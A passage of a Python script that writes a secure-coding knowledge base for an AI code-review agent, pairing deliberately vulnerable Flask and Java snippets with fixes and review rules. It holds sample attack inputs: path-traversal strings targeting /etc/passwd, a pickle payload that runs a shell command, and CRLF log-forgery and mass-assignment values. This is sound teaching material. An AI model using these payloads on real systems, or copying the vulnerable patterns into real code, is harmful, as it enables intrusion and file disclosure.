from werkzeug.utils import secure_filename

app = Flask(__name__)
UPLOAD_FOLDER = os.path.abspath("safe_uploads")
ALLOWED_EXTENSIONS = {".png", ".jpg", ".jpeg", ".pdf"}
MAX_FILE_SIZE = 5 * 1024 * 1024  # 5 Megabytes limit

def is_allowed_file(filename: str) -> bool:
    ext = os.path.splitext(filename)[1].lower()
    return ext in ALLOWED_EXTENSIONS

@app.route("/upload_secure", methods=["POST"])
def upload_file_secure():
    if "avatar" not in request.files:
        abort(400, "No file provided")
    file = request.files["avatar"]
    if file.filename == "":
        abort(400, "Empty filename")

    if not is_allowed_file(file.filename):
        abort(400, "File extension is not allowed")

    # Generate a cryptographically random, collision-free filename
    ext = os.path.splitext(secure_filename(file.filename))[1].lower()
    random_filename = f"{uuid.uuid4().hex}{ext}"
    destination_path = os.path.join(UPLOAD_FOLDER, random_filename)

    # Ensure path stays within intended folder
    if not destination_path.startswith(UPLOAD_FOLDER):
        abort(400, "Path traversal attempt detected")

    file.save(destination_path)
    return {"status": "success", "file_id": random_filename}
```

### 12.4 Upload Review Guidelines
- Store uploads outside the web server's public document root.
- Serve uploaded files with `Content-Disposition: attachment` and `X-Content-Type-Options: nosniff`.
- Strip EXIF metadata to protect user privacy.
- Validate magic bytes (file signature) using filetype or python-magic rather than relying solely on the file extension.
""")

    # Section 13
    sections.append("""## 13. Path Traversal

### 13.1 Directory Traversal Mechanics (CWE-22)
Path traversal (also referred to as directory traversal or dot-dot-slash `../` attacks) occurs when user-supplied input is utilized to construct file system paths without adequate canonicalization and boundary verification.

### 13.2 Exploitation Scenarios
By injecting sequences such as `../../../../etc/passwd` on Unix or `..\..\..\Windows\win.ini` on Windows, an attacker accesses arbitrary system configuration files, database credentials, or application source code. Attackers also use URL encoding (`%2e%2e%2f`) or double encoding (`%252e%252e%252f`) to bypass naive regex filters.

### 13.3 Vulnerable Path Handling Example
```python
# VULNERABLE: Direct path joining without canonicalization
from flask import Flask, request, send_file
import os

app = Flask(__name__)
BASE_DIR = "/var/www/reports"

@app.route("/download")
def download():
    filename = request.args.get("name")
    # Attacker passes: ../../../etc/passwd
    target_path = os.path.join(BASE_DIR, filename)
    return send_file(target_path)
```

### 13.4 Remediated Path Resolution Example
```python
# SECURE: Strict base path verification using Path.resolve()
from flask import Flask, request, abort, send_file
from pathlib import Path

app = Flask(__name__)
BASE_STORAGE_PATH = Path("/var/www/reports").resolve()

@app.route("/download_secure")
def download_secure():
    filename = request.args.get("name", "")
    # Reject null bytes and path separators
    if "\0" in filename or "/" in filename or "\\" in filename:
        abort(400, "Invalid file identifier")

    # Canonicalize and verify the file resides strictly within BASE_STORAGE_PATH
    try:
        target_path = (BASE_STORAGE_PATH / filename).resolve()
        if not target_path.is_file():
            abort(404, "File not found")
        # Ensure target_path starts with BASE_STORAGE_PATH
        if not str(target_path).startswith(str(BASE_STORAGE_PATH)):
            abort(403, "Access denied: Path traversal detected")
        return send_file(str(target_path))
    except Exception:
        abort(404)
```

```java
// SECURE Java: Path canonicalization verification
import java.io.File;
import java.nio.file.Path;
import java.nio.file.Paths;

public class SafeFileReader {
    private static final String BASE_DIR = "/var/www/reports";

    public File getSafeFile(String userFilename) throws SecurityException {
        Path basePath = Paths.get(BASE_DIR).toAbsolutePath().normalize();
        Path resolvedPath = basePath.resolve(userFilename).normalize();

        if (!resolvedPath.startsWith(basePath)) {
            throw new SecurityException("Potential Path Traversal attack detected: " + userFilename);
        }
        return resolvedPath.toFile();
    }
}
```

### 13.5 Review Heuristics for Path Traversal
- Flag any `open()`, `os.path.join()`, `send_file()`, or `new File()` receiving unsanitized URL/query parameters.
- Verify that canonical path validation (`os.path.realpath` or `Path.resolve`) is enforced before file access.
- Check that paths are validated after decoding, not before, to defeat double-encoding evasion.
""")

    # Section 14
    sections.append("""## 14. Unsafe Deserialization

### 14.1 Mechanisms of Deserialization Vulnerabilities (CWE-502)
Serialization converts complex object graphs in memory into byte streams or text formats (JSON, XML, YAML) for storage or network transmission. Deserialization reconstructs objects from streams. When applications deserialize untrusted streams using formats that allow arbitrary class instantiation or method invocation, attackers construct gadget chains leading to Remote Code Execution (RCE).

### 14.2 Dangerous Serialization Formats
- **Python `pickle`**: Uses an interpreted virtual machine; the `__reduce__` method allows execution of arbitrary callables.
- **Java `ObjectInputStream`**: Instantiates classes present on the classpath; gadget chains (e.g., Apache Commons Collections) execute arbitrary commands.
- **PyYAML `yaml.load()`**: By default allows instantiating arbitrary Python objects via `!!python/object`.
- **PHP `unserialize()`**: Invokes magic methods (`__wakeup`, `__destruct`).
- **.NET `BinaryFormatter`**: Highly insecure and formally deprecated by Microsoft due to RCE risks.

### 14.3 Vulnerable Deserialization Examples
```python
# VULNERABLE Python: Deserializing untrusted pickle byte stream
import pickle
from flask import request

@app.route("/state", methods=["POST"])
def restore_session_state():
    raw_data = request.get_data()
    # Attacker payload: b"cos\\nsystem\\n(S'id'\\ntR."
    user_state = pickle.loads(raw_data)
    return {"status": "restored"}
```

```java
// VULNERABLE Java: Unrestricted ObjectInputStream
import java.io.ObjectInputStream;
import java.io.InputStream;

public class SessionDeserializer {
    public Object readUserObject(InputStream in) throws Exception {
        ObjectInputStream ois = new ObjectInputStream(in);
        // Deserializes any class on classpath without filtering!
        return ois.readObject();
    }
}
```

### 14.4 Remediated Deserialization Strategies
1. **Prefer Safe Data-Only Formats**: Migrate from native binary serialization to structured, type-safe formats like JSON or Protocol Buffers.
2. **PyYAML Safe Loading**: Always invoke `yaml.safe_load()` instead of `yaml.load()`.
3. **Java Serialization Filtering (JEP 290)**: Configure strict `ObjectInputFilter` to reject unapproved classes.
4. **Digital Signatures**: If serialized objects must be stored, sign payloads with HMAC-SHA256 and verify the signature before deserializing.

```python
# SECURE Python: Using standard json parser
import json
from flask import request, abort

@app.route("/state_secure", methods=["POST"])
def restore_session_state_secure():
    try:
        user_state = json.loads(request.get_data(as_text=True))
        return {"status": "restored", "username": user_state.get("username")}
    except (json.JSONDecodeError, UnicodeDecodeError):
        abort(400, "Invalid JSON payload")
```

### 14.5 Static Analysis Rules
- Flag any import or use of `pickle.loads()`, `pickle.load()`, `_pickle`, or `shelve`.
- Flag `yaml.load()` lacking `Loader=yaml.SafeLoader` or `yaml.safe_load()`.
- Flag Java `readObject()` lacking object input filters.
""")

    # Section 15
    sections.append("""## 15. Cryptography and Weak Algorithms

### 15.1 Insecure Cryptographic Primitives (CWE-327, CWE-328)
Cryptography protects confidentiality and integrity, but using obsolete algorithms, improper modes of operation, or weak key lengths compromises system security.
- Cryptographic algorithms must never be invented in-house; rely exclusively on established, peer-reviewed primitives.
- Reusing an initialization vector (IV) or nonce in counter-based modes (GCM, CTR) catastrophically destroys confidentiality.

### 15.2 Obsolete and Broken Cryptographic Choices
- **Hash Functions**: MD5 and SHA-1 suffer from practical collision attacks and must never be used for digital signatures or integrity verification. Use SHA-256, SHA-384, or SHA-512.
- **Symmetric Ciphers**: DES and 3DES possess insufficient key lengths and small block sizes vulnerable to Sweet32 attacks. RC4 suffers from keystream biases. Use AES with 128-bit or 256-bit keys.
- **Cipher Block Modes**: Electronic Codebook (ECB) mode encrypts identical plaintext blocks into identical ciphertext blocks, preserving structural patterns. Use Galois/Counter Mode (GCM) for authenticated encryption (AEAD), or CBC mode with HMAC (Encrypt-then-MAC).
- **Asymmetric Key Sizes**: RSA keys under 2048 bits and ECC keys under 256 bits are considered cryptographically deficient.

### 15.3 Vulnerable Cryptographic Example
```python
# VULNERABLE Python: Using MD5 for security token and AES ECB mode
import hashlib
from Crypto.Cipher import AES

def generate_session_token(user_id: str) -> str:
    # MD5 is broken and collision-prone
    return hashlib.md5(user_id.encode()).hexdigest()

def encrypt_sensitive_record(key: bytes, plaintext: bytes) -> bytes:
    # ECB mode leaks data patterns!
    cipher = AES.new(key, AES.MODE_ECB)
    return cipher.encrypt(plaintext)
```

### 15.4 Remediated Modern Cryptography Example
```python
# SECURE Python: Using AES-GCM Authenticated Encryption
import secrets
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

def encrypt_record_secure(key: bytes, plaintext: bytes, associated_data: bytes = b"") -> tuple[bytes, bytes]:
    # AESGCM provides confidentiality and integrity (tamper detection)
    aesgcm = AESGCM(key)
    # Generate fresh 96-bit (12-byte) initialization vector (nonce) for every encryption
    nonce = secrets.token_bytes(12)
    ciphertext = aesgcm.encrypt(nonce, plaintext, associated_data)
    return nonce, ciphertext

def decrypt_record_secure(key: bytes, nonce: bytes, ciphertext: bytes, associated_data: bytes = b"") -> bytes:
    aesgcm = AESGCM(key)
    # Raises InvalidTag exception if ciphertext or nonce was tampered with
    return aesgcm.decrypt(nonce, ciphertext, associated_data)
```

### 15.5 Static Code Analysis Heuristics
- Flag `hashlib.md5()` and `hashlib.sha1()` unless explicitly annotated for non-security use (e.g., git commit hash checks).
- Flag `AES.MODE_ECB` or `Cipher.getInstance("AES/ECB/PKCS5Padding")`.
- Flag hardcoded symmetric keys and static initialization vectors.
- Flag RSA key generation specifying key sizes below 2048 bits.
""")

    # Section 16
    sections.append("""## 16. Secure Random Number Generation

### 16.1 Pseudo-Random vs. Cryptographically Secure Random (CWE-330, CWE-338)
General-purpose pseudo-random number generators (PRNGs) like Python's `random` module (Mersenne Twister MT19937) and Java's `java.util.Random` (Linear Congruential Generator) are deterministic algorithms designed for statistical uniformity, simulations, and game mechanics. They are NOT cryptographically secure.

### 16.2 Security Consequences of Predictable Randomness
After observing 624 consecutive 32-bit outputs of a Mersenne Twister generator, an attacker can reconstruct the internal state and predict all future and past numbers. If used for session tokens, password reset links, or cryptographic keys, attackers can hijack accounts.

### 16.3 Vulnerable Random Number Usage
```python
# VULNERABLE: Using random module for security tokens
import random
import string

def generate_password_reset_token():
    # Mersenne Twister internal state can be fully cloned!
    chars = string.ascii_letters + string.digits
    return "".join(random.choice(chars) for _ in range(32))
```

```java
// VULNERABLE Java: java.util.Random for OTP generation
import java.util.Random;

public class OTPService {
    private Random random = new Random();

    public int generateOTP() {
        return 100000 + random.nextInt(900000); // Predictable linear congruential generator
    }
}
```

### 16.4 Remediated Cryptographically Secure Implementations
```python
# SECURE Python: Using the secrets module (backed by os.urandom)
import secrets

def generate_password_reset_token_secure() -> str:
    # Uses CSPRNG /dev/urandom or CryptGenRandom
    return secrets.token_urlsafe(32)

def generate_secure_otp() -> int:
    # Returns an integer in range [100000, 999999]
    return secrets.randbelow(900000) + 100000
```

```java
// SECURE Java: Using java.security.SecureRandom
import java.security.SecureRandom;

public class SecureOTPService {
    private final SecureRandom secureRandom = new SecureRandom();

    public int generateSecureOTP() {
        return 100000 + secureRandom.nextInt(900000);
    }
}
```

### 16.5 Static Review Rules
- Flag `import random` in files dealing with authentication, tokens, passwords, cryptography, or session IDs.
- Ensure `secrets` (Python) or `SecureRandom` (Java) is utilized for sensitive random generation.
- Check that seed values are not derived from timestamps (`System.currentTimeMillis()`).
""")

    # Section 17
    sections.append("""## 17. Error Handling and Logging

### 17.1 Information Disclosure via Verbose Errors (CWE-209)
Unhandled exceptions displaying stack traces, SQL syntax snippets, internal server IP addresses, or framework version numbers provide attackers with reconnaissance data to construct targeted exploits. Production error pages must return generic status indicators and opaque error correlation IDs.

### 17.2 Log Injection and Sensitive Data Leakage in Logs (CWE-117, CWE-532)
- **Log Injection / CRLF Injection**: Writing unvalidated user input into logs permits attackers to inject Carriage Return (`\r`) and Line Feed (`\n`) characters to forge fake log entries or corrupt log analysis systems.
- **Sensitive Data Logging**: Storing passwords, credit card numbers, authorization tokens, or personally identifiable information (PII) in log files violates compliance standards (PCI-DSS, GDPR).

### 17.3 Vulnerable Error Handling and Logging
```python
# VULNERABLE Flask: Catching exception and exposing stack trace in HTTP response
from flask import Flask, request
import logging

app = Flask(__name__)

@app.route("/process", methods=["POST"])
def process_data():
    try:
        user_input = request.json.get("query")
        # Attacker injects CRLF: "admin\n[INFO] User elevated to admin role"
        logging.info("Processing query: %s", user_input)
        result = execute_business_logic(user_input)
        return {"data": result}
    except Exception as e:
        # Leaking internal stack trace and system details to client
        import traceback
        return {"error": str(e), "traceback": traceback.format_exc()}, 500
```

### 17.4 Remediated Logging and Exception Handling
```python
# SECURE Flask: Sanitized logs, generic error messages, unique incident correlation ID
from flask import Flask, request, jsonify
import logging
import uuid
import re

app = Flask(__name__)
logger = logging.getLogger("secure_app")

def sanitize_for_log(message: str) -> str:
    # Replace newlines and carriage returns to prevent log injection
    return re.sub(r"[\r\n]", "_", str(message))

@app.route("/process_secure", methods=["POST"])
def process_data_secure():
    try:
        user_input = request.json.get("query", "")
        logger.info("Processing query for length %d", len(user_input))
        result = execute_business_logic(user_input)
        return jsonify({"data": result})
    except Exception as e:
        # Generate random incident reference ID for internal tracking
        incident_id = uuid.uuid4().hex[:8]
        logger.error("Incident [%s] Unhandled exception occurred: %s", incident_id, sanitize_for_log(str(e)), exc_info=True)
        # Return opaque response without revealing internal diagnostics
        return jsonify({
            "error": "An unexpected error occurred while processing your request.",
            "incident_id": incident_id
        }), 500
```

### 17.5 Static Review Rules
- Flag bare `except:` blocks that suppress errors without handling.
- Flag HTTP responses returning `traceback.format_exc()` or `str(exception)`.
- Flag logging of variables named `password`, `token`, `secret`, `credit_card`.
- Ensure log formatters escape control characters.
""")

    # Section 18
    sections.append("""## 18. Dependency and Supply-Chain Security

### 18.1 Modern Supply-Chain Threats (A06:2021)
Modern applications consist overwhelmingly of third-party open-source libraries. Supply-chain security encompasses:
- **Known Vulnerabilities (CVEs)**: Using libraries with publicly documented exploits.
- **Typosquatting**: Malicious packages registered under misspelled names of popular libraries (e.g., `reqeusts` instead of `requests`).
- **Dependency Confusion**: Internal private package names claimed on public registries (PyPI, npm).
- **Compromised Maintainer Accounts**: Attackers taking over accounts to push trojanized versions.
- **Malicious Subdependencies**: Deep transitive dependencies injecting cryptominers or stealers.

### 18.2 Dependency Pinning and Lockfiles
Never allow unrestricted version ranges in production manifests. Always pin exact versions and commit lockfiles (`requirements.txt` with hashes, `Pipfile.lock`, `poetry.lock`, Maven `pom.xml` with dependency management).

```text
# VULNERABLE: Floating dependencies vulnerable to breaking changes or compromised updates
flask>=2.0.0
requests
pyyaml

# SECURE: Exact pinned dependencies with hash verification
flask==3.1.3
requests==2.32.5
pyyaml==6.0.3
```

### 18.3 Automated Scanning Tools and Governance
- Python: `pip-audit`, `safety`, `dependabot`.
- Java: `OWASP Dependency-Check`, Snyk, SonarQube.
- Software Bill of Materials (SBOM): Generate CycloneDX or SPDX manifests to inventory all direct and transitive dependencies.
- Establish an open-source vetting policy before introducing new dependencies into the codebase.
""")

    # Section 19
    sections.append("""## 19. API Security

### 19.1 OWASP API Security Top 10 Highlights
APIs present unique attack surfaces compared to traditional server-rendered web applications:
- **API1: Broken Object Level Authorization (BOLA)**: Manipulating IDs in REST URLs.
- **API2: Broken Authentication**: Flawed JWT signature validation, weak token generation.
- **API3: Broken Object Property Level Authorization**: Excessive data exposure in JSON responses or mass assignment of privileged attributes.
- **API4: Unrestricted Resource Consumption**: Lack of rate limiting on endpoints, allowing DoS or credential stuffing.
- **API5: Broken Function Level Authorization**: Non-admin users invoking `/api/v1/users/delete`.
- **API6: Unrestricted Access to Sensitive Business Flows**: Automated bots executing ticket scalping or coupon abuse.
- **API7: Server Side Request Forgery (SSRF)**: Vulnerable webhook integrations fetching internal IP addresses.
- **API8: Security Misconfiguration**: Unnecessary debug headers, unencrypted endpoints, permissive CORS.
- **API9: Improper Inventory Management**: Zombie and shadow APIs left online without security patches.
- **API10: Unsafe Consumption of APIs**: Blindly trusting responses from third-party vendor APIs.

### 19.2 Mass Assignment Vulnerability Example
```python
# VULNERABLE: Mass assignment allowing clients to overwrite admin flags
@app.route("/api/user/profile", methods=["PUT"])
@login_required
def update_profile():
    # Attacker passes: {"name": "Bob", "is_admin": true, "balance": 99999}
    data = request.get_json()
    for key, value in data.items():
        setattr(current_user, key, value)  # Overwrites arbitrary user properties!
    db.session.commit()
    return jsonify({"status": "updated"})
```

### 19.3 Remediated API Data Transfer Object (DTO)
```python
# SECURE: Explicit field mapping using validated schema
from pydantic import BaseModel, Field

class ProfileUpdateRequest(BaseModel):
    name: str = Field(..., max_length=50)
    bio: str = Field("", max_length=250)

@app.route("/api/user/profile_secure", methods=["PUT"])
@login_required
def update_profile_secure():
    payload = ProfileUpdateRequest(**request.get_json())
    current_user.name = payload.name
    current_user.bio = payload.bio
    db.session.commit()
    return jsonify({"status": "updated", "name": current_user.name})
```

### 19.4 API Protection Measures
- Enforce rate-limiting headers (`RateLimit-Limit`, `RateLimit-Remaining`).
- Restrict Cross-Origin Resource Sharing (CORS) to trusted origins; never set `Access-Control-Allow-Origin: *` alongside `Access-Control-Allow-Credentials: true`.
- Validate Content-Type headers (`application/json`) strictly and reject unexpected media types.
""")

    # Section 20
    sections.append("""## 20. Secure Database Access

### 20.1 Principle of Least Privilege in Database Configuration
Database connections must follow defense-in-depth principles:
- **Connection Isolation**: Maintain separate database users for transactional operations (CRUD) versus administrative migrations (DDL: `CREATE`, `ALTER`, `DROP`).
- **Network Boundaries**: Databases should reside on private subnets without public internet addresses.
- **TLS Encryption**: Enforce TLS (`sslmode=require` or `sslmode=verify-full`) for all database client connections.
- **Row-Level Security (RLS)**: Enforce tenant data segregation directly in database engines (e.g., PostgreSQL Row-Level Security policies).

### 20.2 Connection Pooling and Resource Leak Prevention
Improper connection management leads to socket exhaustion and denial of service:
```python
# VULNERABLE: Manual connection without guaranteed cleanup
def get_user_count_bad():
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT count(*) FROM users")
    count = cursor.fetchone()[0]
    # If exception occurs, conn.close() is never called -> Connection Leak!
    conn.close()
    return count
```

```python
# SECURE: Context manager ensuring automatic cleanup
def get_user_count_secure():
    with get_db_connection() as conn:
        with conn.cursor() as cursor:
            cursor.execute("SELECT count(*) FROM users")
            return cursor.fetchone()[0]
```

### 20.3 Migration and Schema Hardening
Store database schemas and migration scripts in version-controlled repositories (e.g., Alembic, Flyway). Enforce foreign key constraints, column-level checks, and encrypted columns for sensitive data at rest. Audit database transaction logs for unusual bulk export operations.
""")

    # Section 21
    sections.append("""## 21. Code Smells and Maintainability

### 21.1 Impact of Code Smells on Security
Code smells are not direct vulnerabilities, but they create fragile, obfuscated codebases where security defects easily hide and refactoring risks introducing regressions:
- **Excessive Cyclomatic Complexity**: Functions with dozens of nested `if`, `for`, `switch` statements make security auditing nearly impossible.
- **God Objects / Bloated Classes**: Classes exceeding thousands of lines violate the Single Responsibility Principle and obscure data flows.
- **Long Parameter Lists**: Methods taking more than 5 parameters encourage parameter swapping bugs.
- **Dead Code and Unused Imports**: Unused code creates false positives during audits and increases the attack surface if inadvertently invoked.
- **Magic Literals**: Hardcoded numbers or strings obscure business intent and prevent centralized policy updates.

### 21.2 Refactoring for Clarity and Robustness
- **Extract Function**: Break monolithic procedures into small, single-purpose functions (under 30 lines) with descriptive names.
- **Guard Clauses**: Replace deep nesting with early returns to clarify preconditions.
- **Constant Extraction**: Replace magic strings and numbers with named enumerations or constants.

```python
# VULNERABLE CODE SMELL: Deep nesting and poor naming
def proc(d):
    if d is not None:
        if len(d) > 0:
            if "val" in d:
                if d["val"] > 100:
                    return True
    return False

# SECURE REFACTORING: Guard clauses and explicit naming
def is_transaction_amount_exceeded(transaction_data: dict) -> bool:
    if not transaction_data:
        return False
    amount = transaction_data.get("val")
    if amount is None:
        return False
    return amount > 100
```

### 21.3 Code Quality Review Metrics
1. **Cyclomatic Complexity**: Keep complexity per function <= 10.
2. **Function Length**: Target functions under 35 physical lines.
3. **Parameter Count**: Limit functions to at most 4 explicit parameters.
4. **Cohesion and Coupling**: High cohesion within modules; low coupling across boundaries.
""")

    # Section 22
    sections.append("""## 22. Security Testing and Code Review

### 22.1 Methodologies of Application Security Testing
- **Static Application Security Testing (SAST)**: White-box analysis inspecting source code or bytecode without executing the application. High coverage, early detection, but potential for false positives.
- **Dynamic Application Security Testing (DAST)**: Black-box analysis probing running applications from the outside. Low false positives for exploitable flaws, but cannot pinpoint exact source code lines.
- **Interactive Application Security Testing (IAST)**: Instrumentation agents running inside the runtime combining SAST and DAST strengths.
- **Software Composition Analysis (SCA)**: Scanning third-party dependencies against vulnerability databases.

### 22.2 Conducting Effective Peer Code Reviews
1. **Focus on Data Ingress and Egress**: Trace user inputs from HTTP parameters to sinks (database, filesystem, system commands, templates).
2. **Review Boundary Conditions**: Check off-by-one errors, empty collections, null pointer dereferences, and extreme numeric limits.
3. **Validate Assumption Invariants**: Question any assumption that "this input will always be well-formed" or "this method is only called internally."
4. **Pair with Automated Linting**: Automate syntax, style, and known pattern checks with static tools so reviewers focus on business logic and architecture.

### 22.3 Code Review Etiquette and Collaboration
- Constructive feedback: Frame findings around risk and architecture rather than subjective developer preference.
- Provide concrete reproducible examples and remediated code snippets in review notes.
- Establish an SLA for addressing review findings before PR merge approval.
""")

    # Section 23
    sections.append("""## 23. Vulnerability Severity and Prioritization

### 23.1 Common Vulnerability Scoring System (CVSS)
CVSS evaluates severity across base metric groups:
- **Attack Vector (AV)**: Network (N), Adjacent (A), Local (L), Physical (P).
- **Attack Complexity (AC)**: Low (L), High (H).
- **Privileges Required (PR)**: None (N), Low (L), High (H).
- **User Interaction (UI)**: None (N), Required (R).
- **Scope (S)**: Unchanged (U), Changed (C).
- **Impact (Confidentiality, Integrity, Availability)**: High (H), Low (L), None (N).

### 23.2 Severity Tiers and Actionable SLAs
- **Critical (Score 9.0 - 10.0)**: Remotely exploitable without authentication leading to complete system compromise (e.g., Remote Code Execution, unauthenticated SQL Injection, hardcoded admin keys). SLA: Remediate immediately within 24 hours.
- **High (Score 7.0 - 8.9)**: Significant compromise requiring limited privileges or user interaction (e.g., Stored XSS, privilege escalation, broken object-level authorization). SLA: Remediate within 7 days.
- **Medium (Score 4.0 - 6.9)**: Difficult to exploit or limited impact (e.g., Reflected XSS requiring social engineering, CSRF with low impact, verbose error messages). SLA: Remediate within 30 days.
- **Low (Score 0.1 - 3.9)**: Informational or minor defense-in-depth deviations (e.g., missing security headers, compiler warnings, weak cookie flags). Remediate during regular development cycles.

### 23.3 Contextual Risk Adjustment
In real-world security engineering, CVSS base scores are adjusted by:
- **Environmental Metrics**: Is the vulnerable component exposed to the public internet or buried behind three layers of authenticated internal firewalls?
- **Exploit Maturity**: Is there an active in-the-wild zero-day exploit available in Metasploit?
- **Compensating Controls**: Does an existing Web Application Firewall (WAF) rule neutralize the payload before it reaches the backend service?
""")

    # Section 24
    sections.append("""## 24. Secure Remediation Examples

### 24.1 Comprehensive Python Vulnerability and Fix Catalog
| Vulnerability | Insecure Code Pattern | Remediated Secure Pattern |
|---|---|---|
| **SQL Injection** | `cursor.execute("SELECT * FROM users WHERE id=" + uid)` | `cursor.execute("SELECT * FROM users WHERE id = ?", (uid,))` |
| **Command Injection** | `os.system("ping " + ip)` | `subprocess.run(["ping", "-c", "1", ip], shell=False)` |
| **Insecure Deserialization** | `pickle.loads(raw_bytes)` | `json.loads(text_payload)` |
| **Weak Crypto** | `hashlib.md5(pwd.encode()).hexdigest()` | `generate_password_hash(pwd, method="scrypt")` |
| **Insecure Random** | `random.choice(string.digits)` | `secrets.choice(string.digits)` |
| **Path Traversal** | `open(os.path.join(DIR, name))` | `(Path(DIR) / name).resolve() # with prefix check` |
| **Code Execution** | `eval(user_expression)` | `ast.literal_eval(user_expression)` |
| **Hardcoded Secret** | `API_KEY = "sk_live_12345"` | `API_KEY = os.environ.get("API_KEY")` |
| **Server Side Template Injection** | `render_template_string("Hello " + name)` | `render_template_string("Hello {{ name }}", name=name)` |
| **XML Entity Injection (XXE)** | `xml.etree.ElementTree.parse(untrusted)` | `defusedxml.ElementTree.parse(untrusted)` |

### 24.2 Comprehensive Java Vulnerability and Fix Catalog
| Vulnerability | Insecure Code Pattern | Remediated Secure Pattern |
|---|---|---|
| **SQL Injection** | `stmt.executeQuery("SELECT * FROM u WHERE id=" + id)` | `conn.prepareStatement("SELECT * FROM u WHERE id = ?")` |
| **Command Injection** | `Runtime.getRuntime().exec(cmd + target)` | `new ProcessBuilder("ping", target)` |
| **Weak Hashing** | `MessageDigest.getInstance("MD5")` | `MessageDigest.getInstance("SHA-256")` |
| **Predictable Random**| `new Random().nextInt()` | `new SecureRandom().nextInt()` |
| **XXE Injection** | Unconfigured `DocumentBuilderFactory` | `dbf.setFeature("...disallow-doctype-decl", true)` |
| **Path Traversal** | `new File(baseDir, userInput)` | Check `path.normalize().startsWith(baseDir)` |
| **LDAP Injection** | `"(&(uid=" + user + "))"` | `new Object[]{user}` with search controls |
| **Insecure Cookie** | `cookie.setHttpOnly(false)` | `cookie.setHttpOnly(true); cookie.setSecure(true)` |

### 24.3 Deep Dive: Refactoring SQL Injection to Parameterized Statements
Consider a dynamic search builder in Python:
```python
# VULNERABLE: Dynamic SQL builder using string concatenation
def build_search_query(category, min_price, max_price):
    query = "SELECT id, name, price FROM products WHERE 1=1"
    if category:
        query += f" AND category = '{category}'"
    if min_price:
        query += f" AND price >= {min_price}"
    if max_price:
        query += f" AND price <= {max_price}"
    return query
```

```python
# SECURE: Dynamic SQL builder with parameterized arguments
def build_search_query_secure(category, min_price, max_price):
    query = "SELECT id, name, price FROM products WHERE 1=1"
    params = []
    if category:
        query += " AND category = ?"
        params.append(category)
    if min_price:
        query += " AND price >= ?"
        params.append(float(min_price))
    if max_price:
        query += " AND price <= ?"
        params.append(float(max_price))
    return query, tuple(params)
```
""")

    # Section 25
    sections.append("""## 25. Common False Positives and Limitations of Static Analysis

### 25.1 Theoretical Limits: Rice's Theorem and the Halting Problem
Computer science theorems prove that any non-trivial semantic property of a computer program cannot be decided with 100% certainty by a static analyzer without false positives or false negatives. Static analysis inspects code structure and syntax trees without running the code with actual runtime inputs.

### 25.2 Distinguishing True Findings from Heuristic Warnings
- **False Positive Causes**:
  - Input that appears untrusted at the function boundary is actually strictly sanitized upstream by an application framework or API gateway.
  - Complex custom sanitizers or validation decorators that the static parser does not model.
  - Mock test code, test fixtures, or documentation examples containing intentional dummy secrets (e.g., `test_password = "password123"`).
  - Variable names matching secret keywords (e.g., `client_secret_placeholder = None`).
  - Constant string queries analyzed where string concatenation occurs only with hardcoded constants.
- **False Negative Causes**:
  - Highly dynamic code constructs, meta-programming, dynamic class instantiation.
  - Logic and business flow vulnerabilities that adhere to syntactic grammar rules (e.g., transferring funds without debiting account).
  - Vulnerabilities split across multiple microservices or distributed queues.
  - Dynamic evaluation inside eval or obfuscated bytecode.

### 25.3 Best Practices for Triaging Review Findings
1. **Contextual Verification**: Confirm whether the flagged parameter is controllable by an untrusted actor.
2. **Defensive Verification**: Verify whether framework-level protections (CSRF tokens, ORM sanitizers) mitigate the risk.
3. **Honest Labeling**: AI and static tools must clearly label findings as *recommendations requiring developer verification* rather than infallible proof of compromise.
4. **Suppression Annotations**: Provide a clear mechanism (e.g., `# noqa: SEC-01` or `@SuppressWarnings("Security")`) for developers to suppress verified false positives with documented justification.
5. **Periodic Triage Reviews**: Security teams should review suppressed findings periodically to ensure developers did not silence legitimate security alerts.
""")

    # Detailed Appendix: Security Reference Architecture & Taxonomy
    sections.append("""## Appendix A: Secure Architecture Patterns and Reference Standards

### A.1 Comprehensive Threat and Mitigation Matrix
| Threat Category | Underlying CWE | Primary Impact | Recommended Architectural Defense |
|---|---|---|---|
| Injection | CWE-89, CWE-78, CWE-77 | RCE, Data Breach | Parameterization, discrete command lists |
| Broken Authentication | CWE-287, CWE-384 | Session Hijack | Adaptive hashing, MFA, secure session cookies |
| Sensitive Data Exposure | CWE-312, CWE-319 | Privacy Violation | TLS 1.3, AES-GCM, environment secrets |
| XXE Injection | CWE-611 | SSRF, Arbitrary Read | Disable external DOCTYPE & entities in parser |
| Broken Access Control | CWE-285, CWE-639 | IDOR, Escalation | Server-side authorization decorators |
| Security Misconfiguration | CWE-16 | Information Leak | Automated hardening, secure base images |
| Insecure Deserialization | CWE-502 | Remote Code Execution | Safe data formats (JSON), strict filtering |
| Insufficient Logging | CWE-778 | Undetected Breach | Centralized SIEM logging, audit trails |

### A.2 Safe Coding Habits for Daily Engineering
1. Never trust user input regardless of source (form, header, query string, cookie, file upload).
2. Avoid concatenating strings to generate code or queries.
3. Keep dependencies lean, actively maintained, and pinned to exact versions.
4. Use automated static code review agents before code reaches pull request review.
5. Practice regular threat modeling for all architectural modifications.
6. Design with fail-secure behavior at all boundaries.
""")

    content = "\n".join(sections)
    output_path.parent.mkdir(parents=True, exist_ok=True)
    with open(output_path, "w", encoding="utf-8") as f:
        f.write(content)
    print(f"[KB Builder] Successfully wrote knowledge base to {output_path}")

if __name__ == "__main__":
    kb_file = Path("C:/Users/Lakshmi/.gemini/antigravity/scratch/AI_Code_Review_Security_Agent/knowledge_base/secure_coding_knowledge_base.md")
    generate_knowledge_base(kb_file)
